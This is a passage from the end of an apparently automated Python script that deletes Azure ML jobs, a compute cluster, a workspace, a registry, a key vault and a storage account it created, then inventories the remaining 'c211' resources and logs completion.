        if nm:
            del_and_wait(base_ws + "/jobs/" + nm + "?api-version=" + API_W,
                         "job-" + nm, 240)
    if own.get("cluster"):
        del_and_wait(base_ws + "/computes/" + CLUSTER + "?api-version=" + API_C,
                     "cluster", 420)
    if own.get("ws"):
        del_and_wait(base_ws + "?api-version=" + API_W, "ws", 600)
    if own.get("acr"):
        del_and_wait(ARM + "/subscriptions/%s/resourceGroups/%s/providers/Microsoft."
                     "ContainerRegistry/registries/%s?api-version=%s"
                     % (sid, RG, own["acr"], REG_VER), "acr", 300)
    if own.get("appi"):
        del_and_wait(ARM + "/subscriptions/%s/resourceGroups/%s/providers/Microsoft."
                     "Insights/components/%s?api-version=2020-02-02"
                     % (sid, RG, own["appi"]), "appi", 240)
    if own.get("kv"):
        del_and_wait(ARM + "/subscriptions/%s/resourceGroups/%s/providers/Microsoft."
                     "KeyVault/vaults/%s?api-version=%s" % (sid, RG, own["kv"], REG_VER),
                     "kv", 240)
    if own.get("sa"):
        del_and_wait(ARM + "/subscriptions/%s/resourceGroups/%s/providers/Microsoft."
                     "Storage/storageAccounts/%s?api-version=%s"
                     % (sid, RG, own["sa"], STG_VER), "sa", 300)

    st, rl = arm(tok, ARM + "/subscriptions/%s/resourceGroups/%s/resources?api-version="
                      "2021-04-01" % (sid, RG), timeout=120)
    mine = [{"name": x.get("name"), "type": x.get("type")}
            for x in ((rl.get("value") or []) if isinstance(rl, dict) else [])
            if str(x.get("name", "")).lower().startswith("c211")]
    emit({"step": "rg-inventory-final", "http": st, "c211": mine})

    emit({"step": "DONE", "ml_state": ml, "cs_state": cs,
          "mode": verdict["mode"], "device": bool(verdict["device"])})
    emit({"step": "PROBE-EXIT", "code": 0})


if __name__ == "__main__":
    main()
